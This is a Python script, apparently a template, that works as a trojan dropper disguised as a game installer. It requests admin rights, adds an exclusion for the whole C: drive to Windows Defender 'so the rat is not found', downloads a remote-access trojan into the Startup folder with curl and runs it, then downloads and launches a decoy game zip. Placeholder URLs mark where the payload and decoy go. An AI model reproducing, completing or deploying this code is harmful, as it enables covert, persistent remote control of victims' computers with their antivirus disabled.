#Update these lines of text
#26-28 these are the places where stuff is downloaded
#33-34 the http adress of the file and the name of the EXE
#39-40 the http adress of the zip of the real game and the name of the zip
#42 start the game.
#
#
#
#
import ctypes, sys
import os
import zipfile
import subprocess
from zipfile import ZipFile
import urllib.request

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if is_admin():
    #setting folders 
    folder = os.path.expanduser("~\AppData\Roaming\Microsoft\Windows\Start Menu\Programs")
    folder2 = os.path.expanduser("~\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\ToxicGaming")
    folderrat = os.path.expanduser("~\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
    #installing a rat
    #adding a exclustion so the rat is not found
    os.system('powershell Add-MpPreference -ExclusionPath "C:\ "')
    os.chdir(folderrat)
    os.system('cmd /c "curl -O (the file you want to execute remotely http adress)"')
    os.system('cmd /c "start the-exe-of-the-file.exe"')
    #install the game
    os.chdir(folder)
    os.mkdir("ToxicGaming")
    os.chdir(folder2)
    os.system('cmd /c "curl -O (what you hide the virus as)"')
    with ZipFile('(the zip of the thing you hide it as)', 'r') as zipObj: 
        zipObj.extractall()
    #start said game
    os.system('cmd /c "start THE-EXE-OF-THE-GAME.exe"')

else:
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1) 